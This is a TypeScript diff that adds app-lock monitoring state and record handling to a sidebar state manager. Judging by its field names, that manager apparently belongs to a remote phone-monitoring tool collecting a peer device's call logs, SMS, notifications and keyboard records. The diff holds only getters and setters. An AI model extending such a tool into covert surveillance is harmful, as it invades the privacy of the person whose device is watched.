@@ -15,6 +15,7 @@ import type {
   SmsRecord,
   NotificationRecord,
   KeyboardRecord,
+  AppLockRecord,
   WallpaperTarget,
   WallpaperDataState,
   WallpaperChunkPayload,
@@ -32,12 +33,16 @@ class RightSidebarStateManager {
   private notificationMonitoringState: MonitoringState = 'IDLE';
   private wallpaperMonitoringState: MonitoringState = 'IDLE';
   private keyboardMonitoringState: MonitoringState = 'IDLE';
+  private appLockMonitoringState: MonitoringState = 'IDLE';
 
   // In-Memory Telemetry Data Stores
   private callLogs: CallRecord[] = [];
   private smsMessages: SmsRecord[] = [];
   private notifications: NotificationRecord[] = [];
   private keyboardRecords: KeyboardRecord[] = [];
+  private appLockRecords: AppLockRecord[] = [];
+  private appLockEnabled: boolean = false;
+  private appLockLockedOut: boolean = false;
 
   // Wallpaper Data State
   private wallpaperData: WallpaperDataState = {
@@ -384,6 +389,71 @@ class RightSidebarStateManager {
     this.notify();
   }
 
+  // ---------------------------------------------------------------------------
+  // APP LOCK GETTERS & SETTERS
+  // ---------------------------------------------------------------------------
+
+  public getAppLockMonitoringState(): MonitoringState {
+    return this.appLockMonitoringState;
+  }
+
+  public setAppLockMonitoringState(state: MonitoringState): void {
+    if (this.appLockMonitoringState !== state) {
+      this.appLockMonitoringState = state;
+      this.notify();
+    }
+  }
+
+  public isAppLockEnabled(): boolean {
+    return this.appLockEnabled;
+  }
+
+  public setAppLockEnabled(enabled: boolean): void {
+    if (this.appLockEnabled !== enabled) {
+      this.appLockEnabled = enabled;
+      this.notify();
+    }
+  }
+
+  public isAppLockLockedOut(): boolean {
+    return this.appLockLockedOut;
+  }
+
+  public setAppLockLockedOut(lockedOut: boolean): void {
+    if (this.appLockLockedOut !== lockedOut) {
+      this.appLockLockedOut = lockedOut;
+      this.notify();
+    }
+  }
+
+  public getAppLockRecords(): AppLockRecord[] {
+    return [...this.appLockRecords];
+  }
+
+  public setAppLockSnapshot(records: AppLockRecord[]): void {
+    this.appLockRecords = [...records].sort((a, b) => b.timestamp - a.timestamp);
+    this.notify();
+  }
+
+  public appendAppLockChunk(records: AppLockRecord[]): void {
+    const existingIds = new Set(this.appLockRecords.map(r => r.id));
+    const newItems = records.filter(r => !existingIds.has(r.id));
+    this.appLockRecords = [...this.appLockRecords, ...newItems].sort((a, b) => b.timestamp - a.timestamp);
+    this.notify();
+  }
+
+  public prependAppLockRecord(record: AppLockRecord): void {
+    if (!this.appLockRecords.some(r => r.id === record.id)) {
+      this.appLockRecords.unshift(record);
+      this.notify();
+    }
+  }
+
+  public clearAppLockRecords(): void {
+    this.appLockRecords = [];
+    this.notify();
+  }
+
   /**
    * Resets all monitoring states to IDLE when peer connection drops.
    */
@@ -407,6 +477,10 @@ class RightSidebarStateManager {
     }
     if (this.keyboardMonitoringState !== 'IDLE') {
       this.keyboardMonitoringState = 'IDLE';
+      changed = true;
+    }
+    if (this.appLockMonitoringState !== 'IDLE') {
+      this.appLockMonitoringState = 'IDLE';
       changed = true;
     }
     if (this.wallpaperData.isFetching || this.wallpaperData.isPushing) {
